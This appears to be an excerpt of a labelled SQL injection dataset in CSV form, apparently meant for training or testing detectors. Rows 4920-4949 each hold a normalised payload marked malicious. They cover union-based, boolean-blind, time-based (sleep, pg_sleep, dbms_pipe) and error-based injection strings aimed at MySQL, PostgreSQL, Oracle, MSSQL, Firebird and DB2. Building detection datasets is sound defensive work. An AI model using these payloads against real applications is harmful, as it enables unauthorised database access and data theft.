row_index,payload_norm,label,sqli_type_hint
4920,"1' in boolean mode ) union all select null,null,null,null,null,null,null--",1,
4921,"1%"" ) ) and 8316 = 6410#",1,
4922,"1'+ ( select zfpk where 9784 = 9784 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",1,
4923,select ( case when ( 3325 = 1767 ) then 3325 else 3325* ( select 3325 from mysql.db ) end ) #,1,
4924,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
4925,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",1,
4926,1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',1,
4927,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'cgou' like 'cgou",1,
4928,1 ) ) ) and 9575 = 1640--,1,
4929,"-3963"" or 1224 = 5119",1,
4930,"1"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
4931,1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
4932,"1"" where 2483 = 2483",1,
4933,"-6442"" ) ) ) or 3038 = 3038",1,
4934,1%' and ( 2439 = 2555 ) *2555 and '%' = ',1,
4935,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""kbex"" like ""kbex",1,
4936,"1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
4937,"-8215%"" ) union all select 3877,3877,3877,3877,3877,3877--",1,
4938,"-7069 ) union all select 6638,6638,6638,6638,6638,6638--",1,
4939,select ( case when ( 8234 = 2498 ) then 8234 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
4940,1' ) where 2120 = 2120,1,
4941,"iif ( 1878 = 2513,1,1/0 )",1,
4942,"1%"" ) ) ) union all select null,null,null,null#",1,
4943,1 ) and sleep ( 5 ) and ( 4855 = 4855,1,
4944,"-9392 ) ) or elt ( 1032 = 1032,3623 ) and ( ( 2975 = 2975",1,
4945,"-8200%"" ) ) union all select 7538,7538,7538#",1,
4946,1 and ( 3437 = 2271 ) *2271,1,
4947,"-5802' ) ) ) union all select 6286,6286,6286,6286#",1,
4948,"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
4949,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) -- uslt",1,
